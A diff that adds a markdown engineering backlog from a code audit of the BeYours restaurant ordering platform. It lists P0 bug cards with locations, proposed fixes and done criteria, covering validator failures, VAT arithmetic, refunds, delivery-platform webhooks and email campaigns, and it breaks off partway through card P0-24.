@@ -1,0 +1,1732 @@
+# Sales-readiness backlog — BeYours
+
+From the 27 Aug 2026 audit (14 domains, all 482 exported Convex functions swept).
+Full report: https://claude.ai/code/artifact/aae4caf8-cc3a-4d6d-896c-19f6f0120ec7
+
+Every card is self-contained: problem, real location, fix, done criteria.
+It doubles as the ClickUp description and the GitHub issue body.
+
+- **`P0` — 35 cards.** Nothing ships until these are closed.
+- **`TECH` — 12 cards.** P1 findings grouped by domain.
+- **`LAUNCH` — 10 cards.** Operator actions and product decisions, outside the repo.
+
+Domain issues #94–113 stay open and act as parents.
+`apps/reference/…` paths are the engine; every client app cloned from `apps/themes/`
+has the same file in the same place unless stated otherwise.
+
+---
+
+## P0-01 · Creating an establishment is rejected by the Convex validator
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #94
+
+### The problem
+No establishment can be created from the dashboard. On a product billed *per store*,
+that is the central commercial gesture failing. The only stores that exist are the
+ones seeded by `seedFixture`.
+
+### Where
+`packages/convex-functions/src/stores.ts:99-113` declares exactly:
+`name, slug, description, address, phone, email`.
+
+`packages/admin/src/pages/stores/stores-page.tsx:236-246` additionally sends:
+```ts
+settings: { currency, timezone, deliveryEnabled, pickupEnabled,
+            dineInEnabled, minimumOrderAmount, deliveryFee,
+            deliveryRadius, taxRate }
+```
+Convex argument objects reject undeclared fields, so the mutation throws. The UI only
+surfaces "Échec de la création de l'établissement".
+
+### Fix
+Drop the `settings` block from `handleCreateStore`. That legacy field has no writer
+anywhere else in the repo.
+
+Side effect to settle: `orderTotals.ts` and `orders.ts:354` still read
+`store.settings?.taxRate`. Either declare a real argument plus UI, or remove
+`storeTaxRate` from `resolveTaxRatePercent`.
+
+### Done when
+A `convex-test` case creates an establishment through the real schema, and the
+"create an establishment" flow passes end to end.
+
+---
+
+## P0-02 · Any service crossing midnight reads as closed all evening
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #94
+
+### The problem
+An evening restaurant cannot sell anything. The open/closed boolean disables
+add-to-cart everywhere and blocks checkout. The shipped `fast-food-minuit` vertical
+and the food-truck templates are directly affected.
+
+### Where
+`packages/restaurant/src/services/store.ts:28`
+```ts
+const isOpen = currentTime >= todayHours.open && currentTime < todayHours.close
+```
+Lexical comparison of `"HH:mm"` strings, with no midnight wrap.
+
+With `open: "18:00", close: "02:00"`:
+- 23:00 → `"23:00" >= "18:00"` true, `"23:00" < "02:00"` **false** → closed
+- 01:00 → `"01:00" >= "18:00"` **false** → closed
+- `09:00–00:00` → closed all day
+
+Consumed by `apps/reference/lib/hooks/use-store-status.ts:30`, which drives
+`storefront-shell.tsx:25` (banner), `storefront-product-card.tsx:30` (disabled
+add-to-cart) and `checkout/page.tsx:331` (hard block).
+
+### Fix
+In `isStoreOpen`, treat `close <= open` as an overnight range:
+```ts
+const overnight = todayHours.close <= todayHours.open
+const isOpen = overnight
+  ? (currentTime >= todayHours.open || currentTime < todayHours.close)
+  : (currentTime >= todayHours.open && currentTime < todayHours.close)
+```
+Also check the *previous* day's row when `currentTime < close`, so 01:00 Saturday
+resolves against Friday's range. Same wrap handling in `nextChange`.
+
+Both hours editors (`store-hours-tab.tsx:53`, `hours-tab.tsx:47`) are plain
+`<input type="time">` with no `close > open` validation — entering `02:00` is
+legitimate and must keep working.
+
+### Done when
+Regression cases pass for `18:00–02:00` at 23:00 and 01:00, and for `09:00–00:00`.
+The current suite (`store-service.test.ts:16-56`) only covers `09:00–18:00`.
+
+---
+
+## P0-03 · VAT is added on top of the displayed price — every customer is overcharged
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #111
+
+### The problem
+The customer pays more than the advertised price on **every order**. At the default
+rate (20), a pizza shown at €12.00 is charged €14.40 by Stripe.
+
+French B2C law requires tax-inclusive display. An owner who enters TTC prices — which
+the law requires — and sets "VAT = 10" overcharges 10% on every order, and files the
+wrong VAT (on €12.00 TTC the VAT is €1.09, not €1.20).
+
+### Where
+`packages/convex-functions/src/orderTotals.ts:69-70`
+```ts
+const taxAmount = Math.round(subtotal * (input.taxRatePercent / 100))
+const total = Math.max(0, subtotal + taxAmount + deliveryFee - discount)
+```
+Default rate **20**: `packages/convex-functions/src/globalSettings.ts:93`.
+
+The product contradicts itself — the label says the opposite of the arithmetic:
+- menu card: raw `formatPrice(product.price)`, `storefront-product-card.tsx:111`
+- admin: field labelled only `Prix (€)`, `product-form.tsx:372`
+- order summary: **"TVA incluse"**, `order-summary.tsx:268`
+
+So it is a bug under either convention, tax-inclusive or tax-exclusive.
+
+### Fix
+Treat `product.price` as tax-inclusive and extract the tax instead of adding it:
+```ts
+const taxAmount = subtotal - Math.round(subtotal / (1 + input.taxRatePercent / 100))
+const total = Math.max(0, subtotal + deliveryFee - discount)
+```
+Then sum **per-product** `taxRate` instead of one store-wide rate: the field exists
+(`packages/convex-schema/src/tables/catalog.ts:39`), the form collects it, the
+Uber/Deliveroo mappers read it — and the order path never does. A menu mixing 10%
+(food) and 20% (alcohol) is currently inexpressible, and the invoice VAT breakdown
+is wrong.
+
+Relabel the admin field `Prix TTC (€)`.
+
+### Done when
+`computeOrderTotals` has a test per rate (0, 5.5, 10, 20) proving
+`total === subtotal + deliveryFee - discount`, plus a mixed-rate breakdown test. An
+e2e asserts the cart total equals the amount actually charged.
+
+---
+
+## P0-04 · Cancelling a paid order fakes the refund, and blocks the real one
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #106
+
+### The problem
+The money stays with the restaurant while the books say it was returned. And it is
+**irreversible**: once this path has run, the real refund is refused by the product.
+The KITCHEN and DELIVERY roles hold `orders:update_status`, so a line cook can
+trigger it.
+
+### Where
+`packages/convex-functions/src/orders.ts:585-604`
+```ts
+if (order.paymentStatus === "paid") {
+  updates.paymentStatus = "refunded"
+  const payments = await ctx.db.query("payments")
+    .withIndex("by_orderId", q => q.eq("orderId", args.id)).collect()
+  for (const payment of payments) {
+    if (payment.status === "succeeded") {
+      await ctx.db.patch(payment._id, {
+        status: "refunded", refundedAmount: payment.amount, ...
+      })
+    }
+  }
+}
+```
+No provider call anywhere. Afterwards `planRefund`
+(`packages/convex-functions/src/refundPolicy.ts:66,81-86`) only accepts `succeeded` /
+`partially_refunded`, so `payments.refundPayment` throws.
+
+`refundPolicy.ts:7-17` documents this exact bug as **fixed** — it was fixed in
+`payments.recordRefund`, not here.
+
+### Fix
+1. Delete the 585-604 block.
+2. On cancelling a paid order: leave `payments` untouched, set a distinct
+   `paymentStatus: "refund_pending"`, and show a banner in the order detail routing
+   the operator to `payments.refundPayment`.
+3. If automatic refunding is wanted:
+   `ctx.scheduler.runAfter(0, internal.payments.refundPayment, …)` — never a bare patch.
+4. Rewrite `packages/convex-functions/src/__tests__/orders.test.ts:325`
+   ("still refunds a paid order when the cancellation is legal"): it calls a database
+   write a refund, and freezes the bug in place.
+
+### Done when
+`updateStatus` patches no `payments` document, proven by a test.
+
+---
+
+## P0-05 · The engine's refund button calls a function that no longer exists
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #106
+
+### The problem
+In `apps/reference` and any app built on `packages/admin`, no refund can be issued
+from the UI. Clicking shows "Échec du remboursement".
+
+### Where
+`packages/admin/src/pages/orders/order-detail-page.tsx:100`
+```ts
+const refundMutation = useMutation(api?.payments?.refund ?? ("skip" as never))
+```
+`payments.refund` was removed — `apps/reference/convex/payments.ts:53-59` says so
+explicitly — and replaced by `refundPayment`, which is an **action** (`:88`).
+`useMutation` cannot call an action, and the generated `api` proxy yields a reference
+for any property name, so the failure is server-side rather than typed.
+
+The correct dialog exists and is mounted nowhere:
+`packages/admin/src/pages/payments/refund-dialog.tsx:34` correctly uses
+`useAction(api.payments.refundPayment)`, but `settings-page.tsx:15,208` mounts
+`PaymentsTab` (provider configuration) rather than `PaymentsTabContent`.
+
+Note: `apps/themes` escapes this (`SettingsContent.tsx:216` mounts the right
+component) but its order detail has no refund button at all.
+
+### Fix
+Switch to `useAction(api.payments.refundPayment)` in `order-detail-page.tsx`, and
+mount `PaymentsTabContent` in the engine's settings tab.
+
+### Done when
+A partial then full refund succeeds from the order detail, in both apps.
+
+---
+
+## P0-06 · Creating a game QR code fails every time
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #107
+
+### The problem
+No QR means no game URL, which means **nobody ever plays**. True in both apps,
+including the test bench.
+
+### Where
+`packages/convex-functions/src/gameQRCodes.ts:14`
+```ts
+return await ctx.db.insert("gameQRCodes", { ...args, createdAt: now, updatedAt: now })
+```
+`args` is `{storeId, code, tableNumber, location, isActive}` — missing
+`scannedCount`, declared **required** in the schema
+(`packages/convex-schema/src/tables/gamification.ts:18`), with `schemaValidation` on.
+
+Reproduced against the real schema with `convex-test`:
+`Validator error: Missing required field 'scannedCount' in object`.
+
+The symptom is already papered over on the read side: `gamePlay.ts:349` does
+`(qr.scannedCount ?? 0) + 1`.
+
+### Fix
+```ts
+return await ctx.db.insert("gameQRCodes", {
+  ...args, scannedCount: 0, createdAt: now, updatedAt: now,
+})
+```
+
+### Done when
+A `convex-test` case inserts **through the real schema**. Pure-logic tests cannot
+catch a validator error — which is exactly why this shipped, alongside
+`e2e/admin/games.spec.ts:23` stating it submits no form.
+
+---
+
+## P0-07 · Sign-up is a dead end
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #113
+
+### The problem
+On a default client deployment nobody can sign in after signing up. The page still
+reports "Compte créé avec succès !" and routes to `/menu` — with no session.
+
+### Where
+`apps/reference/convex/auth.ts:29-31` (identical in `apps/themes`)
+```ts
+requireEmailVerification: process.env.AUTH_ALLOW_UNVERIFIED_EMAIL !== "true",
+```
+On by default. A repo-wide grep for `sendVerificationEmail` or `emailVerification`
+returns **zero results**: no sender is configured.
+
+Better Auth 1.6.17 confirms both halves: `sign-up.mjs:241-250` mints the token and
+sends nothing without a callback, then skips auto-sign-in; `sign-in.mjs:230-231`
+throws `EMAIL_NOT_VERIFIED` (403) and likewise sends nothing.
+
+The only configuration where the product works is `AUTH_ALLOW_UNVERIFIED_EMAIL=true`,
+which the code comment forbids on a deployment serving a restaurant.
+
+### Fix
+Add to `createAuth`, in **both** apps:
+```ts
+emailVerification: {
+  sendOnSignUp: true,
+  sendOnSignIn: true,
+  autoSignInAfterVerification: true,
+  sendVerificationEmail: async ({ user, url }) => {
+    const siteUrl = process.env.SITE_URL
+    const secret = process.env.BETTER_AUTH_SECRET
+    if (!siteUrl || !secret) throw new Error("SITE_URL/BETTER_AUTH_SECRET required")
+    const res = await fetch(`${siteUrl}/api/email/send`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", Authorization: `Bearer ${secret}` },
+      body: JSON.stringify({ type: "verifyEmail", to: user.email,
+        data: { verifyLink: url, userName: user.name ?? user.email } }),
+    })
+    if (!res.ok) throw new Error(`verification email failed: ${res.status}`)
+  },
+},
+```
+Needs a `verifyEmail` arm in the discriminated union at
+`packages/core/src/aws/ses/route-handler.ts:16-34` and a `verifyEmailTemplate` in
+`templates.ts` (only `orderConfirmation`, `passwordReset`, `welcome`, `prizeWon` exist).
+
+Also fix `sign-up/page.tsx:53-57`: stop routing to `/menu` when
+`result.data?.token == null`; show a "check your inbox" state instead.
+
+### Done when
+Sign up → email → link → active session, on a deployment where
+`AUTH_ALLOW_UNVERIFIED_EMAIL` is not set.
+
+---
+
+## P0-08 · The team invitation links to a route that does not exist
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #113
+
+### The problem
+The team feature is decorative end to end: the invitee never receives any rights.
+
+### Where
+`apps/reference/convex/teamMembersEmail.ts:213` and `:290` both link to
+`${appUrl}/invite/${token}`. There is **no `invite` directory** in
+`apps/reference/app` or `apps/themes/app`. `teamMembers.acceptInvitation` (`:189`)
+and `getByInvitationToken` (`:119`) have zero callers outside Convex.
+
+Because `acceptInvitation` is the only thing that writes `userProfiles` — the record
+`getAuthUser` resolves rights from — the roster row grants nothing.
+
+Already documented in `tasks/sprint-durcissement-reference.md:511`:
+"no route containing 'invit'". Known, unfixed.
+
+### Fix
+Add `app/(auth)/invite/[token]/page.tsx` in **both** apps: read via
+`useQuery(api.teamMembers.getByInvitationToken, { token })` to show restaurant and
+role; require a session (link to `/sign-in?redirect=/invite/<token>` and `/sign-up`
+when signed out); then call `useMutation(api.teamMembers.acceptInvitation)({ token })`
+and route to `/dashboard`. Handle the three `TeamAccessError` reasons
+(`invitation_expired`, `invitation_not_pending`, not-found) with distinct copy.
+
+### Done when
+An e2e covering invite → email → acceptance → dashboard access passes.
+`e2e/admin/team.spec.ts` is structural and submits nothing, which is why this shipped.
+
+---
+
+## P0-09 · `orders.create` enforces no availability at all
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #105
+
+### The problem
+Four failures on one path: a deactivated product is ordered and charged; a sold-out
+dish is sent to the kitchen; a pizza is ordered without its required size at the base
+price; and an option with a negative `priceModifier` can be replayed 100 times to
+drive the line to zero. `quantity` is also unbounded — 0 and negatives are accepted.
+
+### Where
+`packages/convex-functions/src/orders.ts:305-345`. The loop re-fetches the product,
+checks existence and `storeId`, and recomputes prices server-side (that part is
+correct) — then goes straight to pricing. It never reads `product.isActive`,
+`product.stock`, `product.scheduling`, `option.required` or `option.maxSelections`,
+and never dedupes `selectedOptions` (`resolvedOptions.push` at `:322`, summed at `:331`).
+
+Enforcement lives only in the browser: `product-detail-client.tsx:93-98` (required
+options) and `packages/restaurant/src/services/product.ts:21-30` (`isProductAvailable`).
+Neither cart nor checkout re-validates.
+`packages/restaurant/src/services/cart.ts:21` (`validateCartItem`) is only ever called
+by its own test.
+
+### Fix
+After fetching each product:
+```ts
+if (!product.isActive) throw new Error(`Unavailable product: ${product.name}`)
+if (!Number.isInteger(item.quantity) || item.quantity <= 0) throw new Error("Invalid quantity")
+if (product.stock?.tracked && product.stock.quantity < item.quantity) throw new Error(`Insufficient stock: ${product.name}`)
+// scheduling window evaluated in globalSettings.timezone
+// per option group: required ⇒ ≥1 choice; count ≤ maxSelections ?? 1; dedupe by choiceId
+```
+
+### Done when
+One test per case (inactive, out of stock, out of window, missing required option,
+duplicated option, zero/negative quantity). No `convex-functions` test currently
+covers `products`, `categories` or `menus`.
+
+---
+
+## P0-10 · Deliveroo orders never reach the kitchen
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #103
+
+### The problem
+In auto mode the order is accepted on Deliveroo's side and a rider is dispatched,
+while **nothing appears in the kitchen**. In manual mode no button in the product can
+accept it: Deliveroo auto-rejects after ~10 minutes, and repeated rejections close
+the site.
+
+### Where
+`apps/reference/convex/deliverooWebhook.ts:310-427` — `handleNewOrder` calls
+`internal.orders.createFromWebhook`, then accepts or rejects, and **never mentions**
+`kitchenTickets`. Compare `apps/reference/convex/uberEatsWebhook.ts:176`, which does
+create the ticket.
+
+Compounding it: `apps/reference/convex/deliverooOrders.ts:15,95,179`
+(`acceptOrder` / `rejectOrder` / `updatePrepStage`) have **zero callers** anywhere in
+the repo, so the whole `ticket.source === "deliveroo"` branch of `TicketCard` is dead code.
+
+### Fix
+After the `if (!created) return` guard (`:338`), add the same
+`ctx.runMutation(internal.kitchenTickets.internalCreate, {...})` block as
+`uberEatsWebhook.ts:176-197`, with `source: "deliveroo"`, mapping `modifiers` into
+`options` and per-item instructions into `notes`. Then wire
+`deliverooOrders.acceptOrder/rejectOrder` into the `TicketCard` accept path
+(`components/admin/kitchen/TicketCard.tsx:90`) alongside the existing Uber branch.
+
+### Done when
+An end-to-end Deliveroo scenario produces a ticket visible on the KDS, and accepting
+from the KDS propagates back to Deliveroo.
+
+---
+
+## P0-11 · Uber Eats special instructions and allergies are dropped before the kitchen
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #100
+
+### The problem
+An Uber Eats customer writes "allergie arachides — sauce à part". The kitchen never
+sees it. The print layout already has a "Note:" block ready to render it
+(`PrintTicketLayout.tsx:125-129`).
+
+### Where
+`apps/reference/convex/uberEatsWebhook.ts:185` — `notes: undefined`, hard-coded.
+
+Meanwhile `packages/integrations/src/uber-eats/mappers.ts:121-125` extracts exactly
+this value:
+```ts
+notes: item.special_instructions
+  ?? item.customer_request?.special_instructions
+  ?? (item.customer_request?.allergy?.instructions
+      ? `Allergie: ${item.customer_request.allergy.instructions}` : undefined),
+```
+It is computed, then thrown away. Lost one level up too: the item validator of
+`createFromWebhook` (`packages/convex-functions/src/orders.ts:692-702`) has **no
+`notes` field**, and `mappedItems` (`:740-751`) never sets one — even though the
+order schema has `items[].notes`
+(`packages/convex-schema/src/tables/orders.ts:45`) and `toKitchenTicketItems` reads
+it (`orders.ts:857`).
+
+### Fix
+Add `notes: v.optional(v.string())` to the `createFromWebhook` item validator, carry
+it through `mappedItems`, and replace `notes: undefined` with `notes: item.notes` at
+`uberEatsWebhook.ts:185` (same for Deliveroo once P0-10 lands).
+
+### Done when
+A test running mapper output through `createFromWebhook` into a ticket proves the
+instruction survives. Current tests validate each half in isolation, which is exactly
+why the seam is broken.
+
+---
+
+## P0-12 · The kitchen ticket is created and printed before payment
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #100
+
+### The problem
+A customer builds a €60 order, reaches Stripe, closes the tab. The slip is already on
+the pass and the kitchen cooks it. Nothing retracts it: `stripeWebhook.ts:31` only
+handles `checkout.session.completed`, there is no `checkout.session.expired` handler
+and no cleanup job. `TicketCard` shows no payment state, so the kitchen cannot tell
+paid from unpaid.
+
+Compounding it: the "Réessayer le paiement" button on
+`app/(storefront)/checkout/cancel/page.tsx:44-48` routes back to `/checkout`, which
+calls `createOrder` again — **a second order and a second kitchen ticket for the same
+meal**.
+
+### Where
+`packages/convex-functions/src/orders.ts:866-889` — `createWithTicket` inserts the
+order (`status: "pending"`, `paymentStatus: "pending"`, `:477,489`) and creates the
+ticket **in the same transaction**, before any provider redirect.
+`kitchenTickets.create` then sets `printStatus: "pending"` whenever
+`printConfig.triggers` contains `"confirmed"` (`kitchenTickets.ts:361-362,387-390`).
+
+### Fix
+Split the seam: `orders.create` inserts only the order. The ticket is created from
+the payment-confirmation path (`stripeWebhook`, PayPal capture, SumUp verify, the cash
+branch), honouring `store.orderConfirmation` (`auto` / `manual`, currently written and
+read by nobody — see TECH-05).
+
+### Done when
+An abandoned payment leaves no ticket and no print job, and a confirmed payment
+produces exactly one.
+
+---
+
+## P0-13 · The KDS query is unbounded — the kitchen screen will go dark
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #100
+
+### The problem
+At 60 orders/day every reactive update re-serialises the whole ticket history to every
+open tablet. Then Convex hits its per-transaction document-read ceiling: the query
+throws, and **the kitchen display goes permanently blank mid-service**, with no admin
+action that can fix it.
+
+### Where
+`packages/convex-functions/src/kitchenTickets.ts:21-30` — `getByStore` does
+`.collect()` over `by_storeId`, every status, no limit; consumed by
+`KitchenContent.tsx:39-42`. Same for `getByStatus` (`:35-55`) behind the "Terminées"
+tab (`CompletedTickets.tsx:47-50`), which dies first.
+There is no cron file anywhere in `apps/*/convex`, so no retention either.
+
+### Fix
+Narrow `getByStore` to the active statuses (`pending` / `in_progress` / `ready`) via
+`by_store_status_createdAt`; paginate `CompletedTickets` (`paginationOpts`, or
+`.take(50)` with a date window); add a scheduled job archiving or deleting tickets
+completed more than N days ago.
+
+### Done when
+A 50,000-ticket dataset degrades neither the KDS nor the completed tab.
+
+---
+
+## P0-14 · Uber cancellation and scheduled-order webhooks match names Uber never sends
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #103
+
+### The problem
+A customer cancels: the handler answers 200, the order stays `confirmed`, the ticket
+stays live, and the kitchen cooks and bags an order that no longer exists.
+
+### Where
+`apps/reference/convex/uberEatsWebhook.ts`. Uber's catalogue is
+`orders.notification`, `orders.scheduled.notification`, `orders.cancel.notification`,
+`orders.release.notification`, `store.provisioned`, `store.deprovisioned`.
+
+The code matches `orders.cancel` / `orders.failure` (`:290`), `orders.scheduled`
+(`:318`) and `eats.order.status_update` (`:84`, `:241`) — the last is not an Uber
+event at all, so the entire status-update branch and its `statusMap` (`:244-253`) are
+dead code. Everything falls through to the "Unknown event type - still acknowledge"
+return at `:398`.
+
+### Fix
+Normalise by stripping a trailing `.notification` before the switch, or match the full
+names. Delete the `eats.order.status_update` branch and drive status from the real events.
+
+### Done when
+One test per real Uber event, asserting the database effect — not just the HTTP code.
+
+---
+
+## P0-15 · An unfetchable Uber order is assigned to an arbitrary store
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #103
+
+### The problem
+On a multi-location account, **every order from every location** lands on the first
+integration with `total: 0` and a single "Commande Uber Eats" line, and the ticket
+prints in the wrong kitchen.
+
+### Where
+`apps/reference/convex/uberEatsWebhook.ts:110-112` and `:342-344`
+```ts
+const integration = unifiedOrder
+  ? allIntegrations.find(i => i.platformStoreId === unifiedOrder.storeExternalId)
+  : allIntegrations[0]
+```
+`unifiedOrder` is `null` whenever `fetchOrder` throws (`:99-101`): 429, 5xx, timeout —
+or the very common sandbox/production mismatch, since `UBER_EATS_SANDBOX_MODE` ships
+as `true` in the `.env.example` templates while the credentials entered are production ones.
+
+### Fix
+Resolve the store from the webhook's own store reference, or refuse to guess: persist
+the raw event to a dead-letter table and alert. Never fall back to index 0.
+
+### Done when
+A webhook whose `fetchOrder` fails creates no order against an unidentified store, and
+leaves an actionable trace.
+
+---
+
+## P0-16 · `auto_accept` marks the order confirmed without accepting it on Uber
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #103
+
+### The problem
+Two failure modes on one path: either Uber is never told and auto-cancels at 11.5
+minutes, or the `acceptOrder` call fails silently. Either way the food is cooked and
+thrown away, and the only trace is a `console.error`.
+
+### Where
+`apps/reference/convex/uberEatsWebhook.ts:209-221` — the `acceptOrder` call is guarded
+by `if (unifiedOrder)` (`:211`) while the local transition to `confirmed` (`:214`) is
+unconditional, and the `catch` (`:219`) only logs. The same swallow exists at
+`apps/reference/convex/kitchenTickets.ts:253-255` and `:266-268` for the manual accept path.
+
+### Fix
+Only set `confirmed` on a 2xx from the provider. On failure, schedule a bounded retry
+and set `platformSyncStatus: "failed"` — the field already exists
+(`packages/convex-schema/src/tables/orders.ts:107`) — so the KDS surfaces it.
+
+### Done when
+A failing `acceptOrder` leaves the order visibly unconfirmed and triggers a retry.
+
+---
+
+## P0-17 · CSV subscriber import fails 100% of the time
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #109
+
+**Problem.** The owner uploads their 800 contacts, sees the preview parse correctly,
+clicks Import, and gets `ArgumentValidationError`. No partial success.
+
+**Where.** `packages/convex-functions/src/emailSubscribers.ts:282-296` requires a
+top-level `consentSource`, and per row `doubleOptInToken: v.string()` +
+`doubleOptInExpiresAt: v.number()` (both non-optional).
+`packages/admin/src/pages/email/subscribers/csv-import-dialog.tsx:71-81` sends
+**none** of them, and adds two rejected fields (`source`, `storeId`).
+Second bug on the same path: `:83` reads `result?.imported`, while `importBatch`
+returns `{ inserted, skipped }`.
+
+**Fix.** In `handleImport`: generate a token per row with
+`generateDoubleOptInToken()` (already exported from `@be-in-digital/marketing`), drop
+`source` and `storeId` from the row objects, pass `consentSource`, and read
+`result.inserted`.
+
+**Done when.** An e2e imports a CSV against a seeded store and asserts the subscriber
+count changes. `e2e/admin/email-subscribers.spec.ts` currently only opens the dialog.
+
+---
+
+## P0-18 · The double opt-in email is never sent by any code path
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #109
+
+**Problem.** Every storefront signup stays `pending` forever and can never be mailed —
+sending filters on `active` (`emailCampaignActions.ts:90-93`). The organic acquisition
+funnel accumulates permanently unreachable rows. The UI lies:
+`subscriber-form.tsx:65` toasts "Abonné ajouté — email de confirmation envoyé".
+
+**Where.** `packages/convex-functions/src/emailSubscribers.ts:140-161` does mint and
+store `doubleOptInToken`, and the `/email/confirm` route exists
+(`apps/reference/convex/http.ts:93-97`) — but a grep for `email/confirm` outside route
+registration returns **nothing**: no code builds the URL and no code sends it.
+
+**Fix.** An `internalAction` sending
+`${CONVEX_SITE_URL}/email/confirm?token=<token>` via SES, scheduled with
+`ctx.scheduler.runAfter(0, …)` from `create` and `importBatch` for every non-`manual` source.
+
+**Done when.** A storefront signup receives the email, the link flips them to `active`,
+and the next campaign reaches them.
+
+---
+
+## P0-19 · Scheduled campaigns never send
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #109
+
+**Problem.** The owner schedules Saturday's brunch campaign for Friday 18:00, reads
+"Campagne planifiée", and it sits at `scheduled` forever. The only way to send is the
+manual menu item.
+
+**Where.** `packages/convex-functions/src/emailCampaigns.ts:157-174` sets
+`status: "scheduled"` + `scheduledAt`, and the wizard offers a date/time picker
+(`campaign-wizard-dialog.tsx:181`). But there is **no `crons.ts` in
+`apps/reference/convex` or `apps/themes/convex`** — only `apps/site` has one — and no
+`ctx.scheduler.runAt` references a campaign.
+
+**Fix.** Add `convex/crons.ts` with an internal action running every minute that lists
+`listByStatus({ status: "scheduled" })` filtered on `scheduledAt <= now` and triggers
+the send. The same file will serve P0-26 (Auto Blog) and KDS retention (P0-13).
+
+**Done when.** A campaign scheduled for T+2 minutes sends on its own.
+
+---
+
+## P0-20 · "Relancer" re-sends the campaign from the first subscriber
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #109
+
+**Problem.** A 1,000-subscriber campaign, paused around 400 to fix a typo, then
+"Relancer": subscribers 1–400 receive the email **a second time**. Real customers,
+real complaints, real SES reputation damage.
+
+**Where.** `packages/admin/src/pages/email/campaigns/email-campaigns-page.tsx:470-477`
+calls `handleSend` → `emailCampaignActions.send`, which accepts status `paused`
+(`apps/reference/convex/emailCampaignActions.ts:72`) and then iterates `subscribers`
+from index 0 (`:123`) with **no cursor, no per-subscriber sent check, no checkpoint**.
+`markSending` likewise allows `paused` (`emailCampaigns.ts:211`). The file even carries
+a comment at `:453` saying a `sent` campaign must never be re-sent.
+
+**Fix.** Before each send, check for an existing `emailEvents` row of type `sent` for
+`(campaignId, subscriberId)` and skip; or persist a `lastSentSubscriberIndex` cursor on
+the campaign and resume from it.
+
+**Done when.** Pause then resume on a seeded list sends no duplicates.
+
+---
+
+## P0-21 · Permanent bounces are retried twice before suppression
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #109
+
+**Problem.** On a list with 5% dead addresses — normal for one built over two years —
+every permanent bounce is mailed three times. That is the exact pattern that triggers
+an AWS sending pause; the published threshold is a 5% bounce rate.
+
+**Where.** `packages/convex-functions/src/emailSubscribers.ts:234-246` — `markBounced`
+only sets `status: "bounced"` at `newCount >= 3`. The webhook
+(`apps/reference/convex/emailHttpHandlers.ts:268-285`) never reads
+`notification.bounce.bounceType`, even though the type is declared at `:153-156`.
+
+**Fix.** In the webhook, suppress immediately when
+`bounce.bounceType === "Permanent"`; keep the 3-strike counter for `Transient` only.
+
+**Done when.** A simulated permanent bounce flips the subscriber to `bounced` on the
+first event.
+
+---
+
+## P0-22 · The SES Configuration Set is hard-coded
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #109
+
+**Problem.** On a client's own AWS account that configuration set does not exist. Every
+`SendEmailCommand` throws `ConfigurationSetDoesNotExist`, the per-subscriber `catch`
+swallows it to `console.error` (`emailCampaignActions.ts:181-183`), `sentCount` stays 0,
+`markSent` runs anyway (`:187`), and the UI toasts "Campagne envoyée (0/342 emails)".
+The owner believes it is a recipient-side problem.
+
+**Where.** `apps/reference/convex/emailCampaignActions.ts:142` and `:255` hard-code
+`ConfigurationSetName: "beindigital-email-tracking"`. Meanwhile
+`AWS_SES_CONFIGURATION_SET` is declared in the env schema
+(`packages/core/src/env/schemas.ts:66`) and in all three `.env.example` files — and
+read **nowhere**.
+
+**Fix.** Read `process.env.AWS_SES_CONFIGURATION_SET` and omit the field when unset;
+abort the loop with a thrown error after N consecutive failures instead of marking the
+campaign `sent` with 0 delivered.
+
+**Done when.** A send without a valid configuration set fails loudly and leaves the
+campaign in a non-`sent` state.
+
+---
+
+## P0-23 · Catalogue GPT translation is dead — three independent blockers
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #95
+
+**Problem.** The owner adds Spanish, saves 60 products, waits. No GPT call is ever
+made, no error surfaces, no product is ever translated. Sold as "~$0.001 per product".
+
+**Where.** Three cumulative blockers:
+1. **The schema has none of the fields.**
+   `packages/convex-schema/src/tables/catalog.ts:29-119` declares no `translations`, no
+   `pendingTranslation`, no `scheduledTranslationJobId` — yet
+   `packages/convex-functions/src/autoTranslate.ts:279-280` writes them. `defineSchema`
+   is called with no options, so validation is on and the patch is rejected. Same for
+   `translationQuota`, absent from `storesTable`.
+2. **`fetch` inside a mutation.** `apps/reference/convex/autoTranslate.ts:19,21`
+   registers `executeTranslation` and `batchChunk` as `internalMutation`, and both call
+   `translateViaGPT` → `fetch()` (`autoTranslate.ts:60`). Convex forbids this. The
+   codebase knows: `cmsAutoTranslate.ts:10` documents the query → fetch → mutation
+   split, and `autoTranslate.ts:141-144` notes an `internalAction` is required.
+3. **Zero callers.** `scheduleTranslation` carries the comment "Call this from
+   product/category/menu mutations" (`apps/reference/convex/autoTranslate.ts:47-48`) and
+   is called nowhere. `products.ts`, `categories.ts` and `menus.ts` contain the string
+   "translat" zero times. `batchChunk` only ever schedules itself, so nothing starts chunk 0.
+
+**Fix.** Add the fields to the catalogue tables and `translationQuota` to `storesTable`;
+re-register `executeTranslation` / `batchChunk` as `internalAction`s orchestrating
+internal query → fetch → internal mutation, following `cmsAutoTranslate.ts`; call
+`scheduleTranslation` from `products.create/update`, `categories.create/update`,
+`menus.create/update`.
+
+**Done when.** Creating a product with a second active language produces a translation
+visible on the storefront.
+
+---
+
+## P0-24 · Switching language changes nothing the customer can read
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #95
+
+**Problem.** A customer picks Español on a live storefront. The page reloads. Menu,
+buttons, product names, cart — all still French. Only `<html lang="es">` changed.
+
+**Where.** `apps/reference/components/storefront/language-selector-dropdown.tsx:43-47`
